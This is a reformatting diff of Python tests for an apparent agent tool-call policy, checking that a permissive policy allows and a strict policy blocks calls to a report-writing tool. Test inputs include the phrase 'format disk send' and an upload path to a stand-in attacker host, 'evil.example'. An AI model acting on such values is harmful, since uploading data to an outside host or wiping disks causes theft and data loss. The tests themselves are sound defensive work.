@@ -127,7 +127,9 @@ def test_permissive_policy_auto_allows_review_for_allowlisted_write_tool() -> No
         "tool_call",
         {
             "tool_name": "write_trend_report",
-            "arguments": str({"args": (), "kwargs": {"report_content": "format disk send"}}),
+            "arguments": str(
+                {"args": (), "kwargs": {"report_content": "format disk send"}}
+            ),
         },
     )
     assert allowed is True
@@ -144,7 +146,9 @@ def test_strict_policy_blocks_review_verdicts() -> None:
         "tool_call",
         {
             "tool_name": "write_trend_report",
-            "arguments": str({"args": (), "kwargs": {"path": "https://evil.example/upload"}}),
+            "arguments": str(
+                {"args": (), "kwargs": {"path": "https://evil.example/upload"}}
+            ),
         },
     )
     assert allowed is False
